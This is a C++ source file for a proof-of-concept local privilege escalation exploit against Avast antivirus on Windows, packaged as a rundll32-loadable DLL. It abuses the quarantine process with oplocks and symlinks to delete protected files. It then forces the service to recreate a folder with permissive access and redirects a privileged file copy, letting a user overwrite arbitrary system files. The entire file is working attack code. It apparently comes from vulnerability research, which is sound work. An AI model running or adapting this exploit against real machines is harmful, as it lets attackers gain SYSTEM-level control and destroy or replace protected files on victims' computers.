#include <Windows.h>
#include <AclAPI.h>
#include <sddl.h>

#include "AswQuarantineFileExploit.h"
#include "detours.h"
#include "wil/stl.h"
#include "wil/resource.h"
#include "wil/win32_helpers.h"
#include "CommonUtils/CommonUtils.h"
#include "SymbolicLinkUtils/CommonUtils.h"
#include "SymbolicLinkUtils/FileSymlink.h"
#include "SymbolicLinkUtils/FileOpLock.h"
#include "AavmRpcClientV2/AavmRpcClientV2.h"
#include "AswChestRpcCLient/AswChestRpcClient.h"

#include <string>
#include <thread>
#include <fstream>
#include <iostream>
#include <stdexcept>
#include <filesystem>

namespace fs = std::filesystem;

EntryPointType g_originalEntryPoint;

void CALLBACK ExploitW(
    _In_ HWND      Window,
    _In_ HINSTANCE ModuleHandle,
    _In_ LPWSTR    CommandLine,
    _In_ INT       ShowCommand
)
{
    UNREFERENCED_PARAMETER(Window);
    UNREFERENCED_PARAMETER(ModuleHandle);
    UNREFERENCED_PARAMETER(ShowCommand);

    try
    {
        int argumentsCount;

        auto pArgv = ::CommandLineToArgvW(CommandLine, &argumentsCount);
        if (!pArgv)
            throw std::runtime_error("CommandLineToArgvW failed. Error: " + std::to_string(::GetLastError()));
        auto freeArgvOnExit = wil::scope_exit([pArgv] { ::LocalFree(pArgv); });

        if (CommandLine[0] == L'\0' || argumentsCount != 2)
            throw std::runtime_error("Invalid usage! Usage: rundll32.exe AswQuarantineFileExploit.dll,Exploit SourceFilePath TargetFilePath");

        //
        // Step 0: Bypass self-defense and pass arguments
        //

        BypassSelfDefense(pArgv[0], pArgv[1]);
    }
    catch (const std::exception &e)
    {
        // ToDo: Log error
        std::cerr << "Exception: " << e.what() << std::endl;
        __debugbreak();
    }
}

namespace
{
    void AddDenyCreateFileACEForSystem(_In_ const fs::path &path)
    {
        // Get a pointer to the existing DACL
        PACL pOldDACL;
        PSECURITY_DESCRIPTOR pSD;

        auto returnValue = ::GetNamedSecurityInfo(
            path.c_str(), SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &pOldDACL, NULL, &pSD);
        if (returnValue != ERROR_SUCCESS)
            throw std::runtime_error("GetNamedSecurityInfo failed. Error: " + std::to_string(returnValue));
        auto freeSDOnExit = wil::scope_exit([pSD] { ::LocalFree(pSD); });

        // Initialize an EXPLICIT_ACCESS structure for the new ACE
        EXPLICIT_ACCESS eaAccess;

        PSID pLocalSystemSid;
        if (!::ConvertStringSidToSid(L"S-1-5-18", &pLocalSystemSid))
            throw std::runtime_error("ConvertStringSidToSid failed. Error: " + std::to_string(::GetLastError()));
        auto freeSidOnExit = wil::scope_exit([pLocalSystemSid] { ::LocalFree(pLocalSystemSid); });

        ZeroMemory(&eaAccess, sizeof(EXPLICIT_ACCESS));
        eaAccess.grfAccessPermissions = FILE_ADD_FILE;
        eaAccess.grfAccessMode = DENY_ACCESS;
        eaAccess.grfInheritance = NO_INHERITANCE;
        eaAccess.Trustee.TrusteeForm = TRUSTEE_IS_SID;
        eaAccess.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
        eaAccess.Trustee.ptstrName = reinterpret_cast<LPTSTR>(pLocalSystemSid);

        // Create a new ACL that merges the new ACE into the existing DACL
        PACL pNewDACL;

        returnValue = ::SetEntriesInAcl(1, &eaAccess, pOldDACL, &pNewDACL);
        if (returnValue != ERROR_SUCCESS)
            throw std::runtime_error("SetEntriesInAcl failed. Error: " + std::to_string(returnValue));
        auto freeDACLOnExit = wil::scope_exit([pNewDACL] { ::LocalFree(pNewDACL); });

        // Attach the new ACL as the object's DACL
        returnValue = ::SetNamedSecurityInfo(
            const_cast<LPWSTR>(path.c_str()), SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pNewDACL, NULL);
        if (returnValue != ERROR_SUCCESS)
            throw std::runtime_error("SetNamedSecurityInfo failed. Error: " + std::to_string(returnValue));
    }

    auto CreateNativeSymlink(
        _In_ const fs::path &srcPath,
        _In_ const fs::path &dstPath
    )
    {
        auto pSymlink = std::make_unique<FileSymlink>();
        if (!pSymlink->CreateSymlink(srcPath.c_str(), dstPath.c_str(), nullptr))
            throw std::runtime_error("Cannot create symlink from " + srcPath.string() + " to " + dstPath.string() + ". Error: " + std::to_string(::GetLastError()));

        return pSymlink;
    }

    std::unique_ptr<FileOpLock> ExecuteOnPostProbePath(
        _In_ const fs::path &probeAccessFilePath,
        _In_ const std::function<void(void)> &postProbeFileAccessCallback
    )
    {
        auto pFileOpLock = std::unique_ptr<FileOpLock>(
            FileOpLock::CreateLock(
                probeAccessFilePath,
                L"rw",
                postProbeFileAccessCallback));
        if (!pFileOpLock)
            throw std::runtime_error("Cannot create oplock on " + probeAccessFilePath.string() + ". Error: " + std::to_string(::GetLastError()));

        return pFileOpLock;
    }

    void AswQuarantineFileExploit(const fs::path &targetFilePath)
    {
        auto thisModuleBaseAddress =
            DetourGetContainingModule(DetourCodeFromPointer(AswQuarantineFileExploit, nullptr));
        if (!thisModuleBaseAddress)
            throw std::runtime_error("DetourGetContainingModule failed");

        const auto thisModulePath =
            fs::path(wil::GetModuleFileNameW<std::wstring>(thisModuleBaseAddress));
        const auto thisModuleParentPath = thisModulePath.parent_path(); // User accessible path

        const auto switchDirectoryPath = thisModuleParentPath / L"Switch";
        const auto malwareFilePath = switchDirectoryPath / (utils::com::CreateGuid() + ".dll");

        if (!fs::exists(targetFilePath))
            throw std::runtime_error("Target file doesn't exist!");

        constexpr auto probeFilePath = LR"(C:\ProgramData\Avast Software\Avast\log\Cleaner.log)";

        fs::create_directory(switchDirectoryPath);
        auto removeDirectory = wil::scope_exit([&switchDirectoryPath] { std::error_code errorCode;  fs::remove(switchDirectoryPath, errorCode); });

        std::cout << "[*] Setting directory " << switchDirectoryPath << " restrictive security descriptor..." << std::endl;
        AddDenyCreateFileACEForSystem(switchDirectoryPath);
        std::cout << "[+] Security descriptor has been successfully set." << std::endl;

        std::cout << "[*] Creating test virus " << malwareFilePath << "..." << std::endl;
        utils::av::CreateTestVirus(malwareFilePath);
        std::cout << "[+] Test virus has been successfully created." << std::endl;

        if (!fs::exists(probeFilePath))
        {
            std::cout << "[*] Probe file doesn't exist. Creating probe file " << probeFilePath << "..." << std::endl;

            auto ofs = std::ofstream(probeFilePath, std::ios::out);
            if (!ofs.is_open())
            {
                throw std::runtime_error("Cannot create probe file file.");
            }

            std::cout << "[+] Probe file has been successfully created." << std::endl;
        }

        std::unique_ptr<FileSymlink> pNativeSymlink;

        auto switchJunctionToUserInAccessibleLocation =
            [&pNativeSymlink, &malwareFilePath, &targetFilePath]()
        {
            fs::remove(malwareFilePath);

            pNativeSymlink = CreateNativeSymlink(malwareFilePath, targetFilePath);
        };

        std::wcout << L"[*] Creating oplock on \"" << probeFilePath << L"\" to switch link " << malwareFilePath
            << L" to user inaccessible file " << targetFilePath << L" just post probe file access..." << std::endl;
        auto pProbeFileAccessOpLock =
            ExecuteOnPostProbePath(probeFilePath, std::move(switchJunctionToUserInAccessibleLocation));
        std::cout << "[+] Oplock has been successfully created." << std::endl;

        std::cout << "[*] Waiting for test virus will be quarantined... You can force it if scan this file manually." << std::endl;
        pProbeFileAccessOpLock->WaitForLock(INFINITE);
        utils::av::WaitUntilVirusWillBeQuarantined(malwareFilePath);

        if (!fs::exists(targetFilePath))
            std::cout << "[+] Target file " << targetFilePath << " has been successfully removed." << std::endl;
        else
            std::cout << "[-] Target file " << targetFilePath << " hasn't been removed." << std::endl;
    }
} // anonymous namespace

int APIENTRY EscalatePrivileges()
{
    try
    {
        auto pCommandLine = ::GetCommandLineW();
        int argumentsCount;

        auto pArgv = ::CommandLineToArgvW(pCommandLine, &argumentsCount);
        if (!pArgv)
            throw std::runtime_error("CommandLineToArgvW failed. Error: " + std::to_string(::GetLastError()));
        auto freeArgvOnExit = wil::scope_exit([pArgv] { ::LocalFree(pArgv); });

        if (argumentsCount != 3)
            throw std::runtime_error("Invalid usage!");

        const std::wstring sourceFilePath = pArgv[1];
        const std::wstring targetFilePath = pArgv[2];

        //
        // Step 1: Delete target file, the contents of directory "C:\ProgramData\Avast Software\Avast\fw" (if it is a directory)
        // and then delete directory itself
        //

        if (fs::exists(targetFilePath))
            AswQuarantineFileExploit(targetFilePath);

        constexpr auto fwDirectoryPath = LR"(C:\ProgramData\Avast Software\Avast\fw)";

        if (fs::exists(fwDirectoryPath) && fs::is_directory(fwDirectoryPath))
        {
            for (const auto &directoryEntry : fs::directory_iterator(fwDirectoryPath))
            {
                AswQuarantineFileExploit(directoryEntry.path());
            }

            AswQuarantineFileExploit(std::wstring(fwDirectoryPath) + L"::$INDEX_ALLOCATION");
        }

        //
        // Step 2: Restart AvastSvc service. On starting if "C:\ProgramData\Avast Software\Avast\fw" directory
        // doesn't exist service creates it with permissive DACL (FA for Everyone)
        //

        {
            AswChestRpcClient aswChestRpcClient;

            long chestId;
            unsigned char fileContent[] = "test";
            wchar_t *propertiesArray[] = { nullptr /* Key */, nullptr /* Value */ };

            aswChestRpcClient.AddFile(
                &chestId, fileContent, sizeof(fileContent), propertiesArray, _countof(propertiesArray) / 2);
        }

        //
        // Step 3: Set up symlinks in attacker controlled directory and trigger privileged CopyFile()
        //

        {
            using namespace std::chrono_literals;

            while (!fs::exists(fwDirectoryPath))
                std::this_thread::sleep_for(500ms);

            std::unique_ptr<FileSymlink> pSourceNativeSymlink;
            pSourceNativeSymlink = CreateNativeSymlink(
                fs::path(fwDirectoryPath) / L"config.ori", sourceFilePath);

            std::unique_ptr<FileSymlink> pTargetNativeSymlink;
            pTargetNativeSymlink = CreateNativeSymlink(
                fs::path(fwDirectoryPath) / L"config.xml", targetFilePath);

            AavmRpcClient aavmRpcClient;

            while (true)
            {
                HRESULT hr;
                aavmRpcClient.ResetIniFiles(hr);

                if (SUCCEEDED(hr))
                {
                    break;
                }
                else // if (FAILED(hr))
                {
                    if (hr != HRESULT_FROM_WIN32(RPC_S_SERVER_UNAVAILABLE) &&
                        hr != 0x80046300 /* Aavm core wasn't started yet */)
                        THROW_HR(hr);

                    std::this_thread::sleep_for(100ms);
                }
            }
        }
    }
    catch (const std::exception &e)
    {
        // ToDo: Log error
        std::cerr << "Exception: " << e.what() << std::endl;
        __debugbreak();
    }

    ::ExitProcess(0);

    //return /*g_originalEntryPoint()*/0;
}
